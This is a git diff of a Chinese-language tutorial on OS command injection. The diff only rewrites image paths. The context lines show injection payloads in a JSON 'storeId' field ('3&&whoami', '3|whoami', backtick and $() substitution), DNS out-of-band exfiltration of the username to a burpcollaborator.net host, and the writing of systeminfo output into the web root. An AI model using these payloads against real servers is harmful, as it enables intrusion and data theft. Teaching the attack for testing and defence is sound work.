@@ -1,7 +1,7 @@
 ## 定义
 OS 命令注入（也称为 shell 注入）是一种 Web 安全漏洞，允许攻击者在运行应用程序的服务器上执行任意操作系统 (OS) 命令，并且通常会完全破坏应用程序及其所有数据。通常，攻击者可以利用操作系统命令注入漏洞来破坏托管基础架构的其他部分，利用信任关系将攻击转向组织内的其他系统。
 
-![image.png](./OS 注入.assets/2023_05_19_10_39_55_CZfoN76I.png)
+![image.png](OS 注入.assets/2023_05_19_10_39_55_CZfoN76I.png)
 
 
 
@@ -55,7 +55,7 @@ app.listen(8088, () => {
 
 正常情况返回
 
-![image.png](./OS 注入.assets/2023_05_19_10_39_55_Cbc3Tvh4.png)
+![image.png](OS 注入.assets/2023_05_19_10_39_55_Cbc3Tvh4.png)
 
 当在storeId后添加执行命令的参数来进行os命令注入，如下
 
@@ -65,7 +65,7 @@ app.listen(8088, () => {
   "storeId":"3&&whoami"
 }
 ```
-![image.png](./OS 注入.assets/2023_05_19_10_39_55_Pt2JXTQO.png)
+![image.png](OS 注入.assets/2023_05_19_10_39_55_Pt2JXTQO.png)
 
 
 
@@ -78,7 +78,7 @@ app.listen(8088, () => {
 ```
 
 
-![image.png](./OS 注入.assets/2023_05_19_10_39_56_iqzy8C4T.png)
+![image.png](OS 注入.assets/2023_05_19_10_39_56_iqzy8C4T.png)
 
 
 
@@ -129,7 +129,7 @@ app.listen(8088, () => {
 
 
 
-![image.png](./OS 注入.assets/2023_05_19_10_39_56_AOWcw3Zp.png)
+![image.png](OS 注入.assets/2023_05_19_10_39_56_AOWcw3Zp.png)
 
 
 
@@ -142,7 +142,7 @@ app.listen(8088, () => {
 ```
 
 
-![image.png](./OS 注入.assets/2023_05_19_10_39_56_LCSqUKEo.png)
+![image.png](OS 注入.assets/2023_05_19_10_39_56_LCSqUKEo.png)
 
 
 
@@ -153,16 +153,16 @@ app.listen(8088, () => {
   "storeId":"3|whoami"
 }
 ```
-![image.png](./OS 注入.assets/2023_05_19_10_39_57_ftki0RIu.png)
+![image.png](OS 注入.assets/2023_05_19_10_39_57_ftki0RIu.png)
 
 
 
 #### \>
-![image.png](./OS 注入.assets/2023_05_19_10_39_57_jk3AGIqM.png)
+![image.png](OS 注入.assets/2023_05_19_10_39_57_jk3AGIqM.png)
 
 
 
-![image.png](./OS 注入.assets/2023_05_19_10_39_57_VNr0FP9d.png)
+![image.png](OS 注入.assets/2023_05_19_10_39_57_VNr0FP9d.png)
 
 
 
@@ -173,9 +173,9 @@ app.listen(8088, () => {
 "storeId":"3&systeminfo>>test.txt"
 }
 ```
-![image.png](./OS 注入.assets/2023_05_19_10_39_58_XDGVCtUd.png)
+![image.png](OS 注入.assets/2023_05_19_10_39_58_XDGVCtUd.png)
 
-![image.png](./OS 注入.assets/2023_05_19_10_39_58_scajelVv.png)
+![image.png](OS 注入.assets/2023_05_19_10_39_58_scajelVv.png)
 
 在无回显的时候，注意找到web绝对路径，然后再写入到web路径中去，然后再去访问写入的文件查看命令
 
@@ -184,7 +184,7 @@ Linux中的`;`对应windows的`&` 用法一致，还有`&&`，`|`，`||` ，`>`�
 #### &
 & 在Linux中是将任务给后台执行，并告知pid，然后再执行后面的命令，当第一个命令执行完毕之后，再返回结果，最后告知第一个命令执行完毕
 
-![image.png](./OS 注入.assets/2023_05_19_10_39_59_s0BrLFe1.png)
+![image.png](OS 注入.assets/2023_05_19_10_39_59_s0BrLFe1.png)
 
 那么对应的payload如下：
 
@@ -194,13 +194,13 @@ Linux中的`;`对应windows的`&` 用法一致，还有`&&`，`|`，`||` ，`>`�
 "storeId":"3&whoami"
 }
 ```
-![image.png](./OS 注入.assets/2023_05_19_10_39_59_lZRmNX68.png)
+![image.png](OS 注入.assets/2023_05_19_10_39_59_lZRmNX68.png)
 
 
 
 #### \`\`(反斜杠)
  反斜杠里的字符串是被Linux shell环境直接执行的，类似php的shell_exec()函数，这个函数简写也是````，它的返回值就是命令执行结果，如下所示 
-![image.png](./OS 注入.assets/2023_05_19_10_39_59_Pc84yoFN.png)
+![image.png](OS 注入.assets/2023_05_19_10_39_59_Pc84yoFN.png)
 那么当`; && & ||` 被过滤掉时，无法构造第二条命令的时候，这时```` 就发挥作用了，如下payload
 
 ```shell
@@ -208,16 +208,16 @@ ping -c 2 127.0.0.1`whoami`
 ```
 可以看到，``whoami`` 的执行结果已经和127.0.0.1拼接在一起了，通过shell报错也能获取命令
 
-![image.png](./OS 注入.assets/2023_05_19_10_40_00_Wr4zHwxR.png)
+![image.png](OS 注入.assets/2023_05_19_10_40_00_Wr4zHwxR.png)
 
-![image.png](./OS 注入.assets/2023_05_19_10_40_00_eL28BynE.png)
+![image.png](OS 注入.assets/2023_05_19_10_40_00_eL28BynE.png)
 
 
 
 #### $()
 在shell编程中，$()中存放的是命令，相当于``
 
-![image.png](./OS 注入.assets/2023_05_19_10_40_00_5gFDEvd9.png)
+![image.png](OS 注入.assets/2023_05_19_10_40_00_5gFDEvd9.png)
 
 
 
@@ -263,16 +263,16 @@ app.listen(8088, () => {
     console.log('running!')
 })
 ```
-![image.png](./OS 注入.assets/2023_05_19_10_40_01_aA3TBExH.png)
+![image.png](OS 注入.assets/2023_05_19_10_40_01_aA3TBExH.png)
 
 在无回显盲注的情况下，在判断是否存在注入点时，可以使用dnslog来判断，也可以使用ping方法（**Linux机器一定要加-c参数，否则会造成拒绝服务攻击**)
 
 ### DNSLOG
 
 #### windows
-![image.png](./OS 注入.assets/2023_05_19_10_40_01_IXaRznjs.png)
+![image.png](OS 注入.assets/2023_05_19_10_40_01_IXaRznjs.png)
 
-![image.png](./OS 注入.assets/2023_05_19_10_40_01_W0UVpM78.png)
+![image.png](OS 注入.assets/2023_05_19_10_40_01_W0UVpM78.png)
 
 windows 不像Linux那样可以使用```` 以及`$()`外带命令执行的结果，但是可以利用windows的变量来外带数据
 
@@ -315,7 +315,7 @@ windows 不像Linux那样可以使用```` 以及`$()`外带命令执行的结果
 "storeId":"3&ping -n 1 %USERNAME%.6cjo9fo3iffy96gtta0h3lwjoau0ip.burpcollaborator.net"
 }
 ```
-![image.png](./OS 注入.assets/2023_05_19_10_40_02_LhBoJZxD.png)
+![image.png](OS 注入.assets/2023_05_19_10_40_02_LhBoJZxD.png)
 
 
 
@@ -326,11 +326,11 @@ windows 不像Linux那样可以使用```` 以及`$()`外带命令执行的结果
   "storeId":"3;ping -c 1 `whoami`.6cjo9fo3iffy96gtta0h3lwjoau0ip.burpcollaborator.net"
 }
 ```
-![image.png](./OS 注入.assets/2023_05_19_10_40_02_f6qHSPZM.png)
+![image.png](OS 注入.assets/2023_05_19_10_40_02_f6qHSPZM.png)
 
-![image.png](./OS 注入.assets/2023_05_19_10_40_02_wxFU79ub.png)
+![image.png](OS 注入.assets/2023_05_19_10_40_02_wxFU79ub.png)
 
-![image.png](./OS 注入.assets/2023_05_19_10_40_03_InKWrhc4.png)
+![image.png](OS 注入.assets/2023_05_19_10_40_03_InKWrhc4.png)
 
 
 
@@ -344,16 +344,16 @@ windows 不像Linux那样可以使用```` 以及`$()`外带命令执行的结果
 "storeId":"3&systeminfo > ./public/html/1.txt"
 }
 ```
-![image.png](./OS 注入.assets/2023_05_19_10_40_03_rS2Ex9VT.png)
+![image.png](OS 注入.assets/2023_05_19_10_40_03_rS2Ex9VT.png)
 
-![image.png](./OS 注入.assets/2023_05_19_10_40_03_gztGjiCl.png)
+![image.png](OS 注入.assets/2023_05_19_10_40_03_gztGjiCl.png)
 
 
 
 #### Linux
-![image.png](./OS 注入.assets/2023_05_19_10_40_04_lA3ywOcn.png)
+![image.png](OS 注入.assets/2023_05_19_10_40_04_lA3ywOcn.png)
 
-![image.png](./OS 注入.assets/2023_05_19_10_40_04_0M6hOkKg.png)
+![image.png](OS 注入.assets/2023_05_19_10_40_04_0M6hOkKg.png)
 
 
 
